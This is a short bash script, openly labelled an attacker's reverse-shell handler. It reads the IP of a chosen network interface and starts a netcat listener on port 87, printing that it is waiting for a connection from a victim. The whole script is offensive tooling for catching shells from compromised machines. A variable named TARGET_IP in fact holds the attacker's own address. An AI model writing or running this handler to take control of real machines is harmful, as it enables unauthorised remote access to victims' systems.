#!/bin/bash
# ------------------------------------------------------------------
#  Automated Reverse Shell Handler - Attacker Script
# ------------------------------------------------------------------

echo "================================================="
echo "  Reverse Shell Connection Handler (Attacker)   "
echo "================================================="

# Prompt user for the network interface
echo -n "[*] Please enter the network interface (e.g., eth0, wlan0): "
read interface

# Function to dynamically parse and extract the IP address of the selected interface
get_ip () {
    ifconfig "$interface" 2>/dev/null | grep "inet " | awk '{print $2}' | sed '2,$d'
}

# Validate if the interface has a valid IP
TARGET_IP=$(get_ip)

if [ -z "$TARGET_IP" ]; then
    echo "[-] Error: Could not retrieve IP address for interface $interface."
    echo "[-] Please check the interface name and ensure it is connected."
    exit 1
fi

PORT=87
echo "[+] Detected IP for $interface: $TARGET_IP"
echo "[+] Starting Netcat listener on port $PORT..."
echo "[*] Waiting for incoming connection from victim..."
echo "================================================="

# Start the listener bound to the specific interface IP
nc -lnvp $PORT -s "$TARGET_IP"
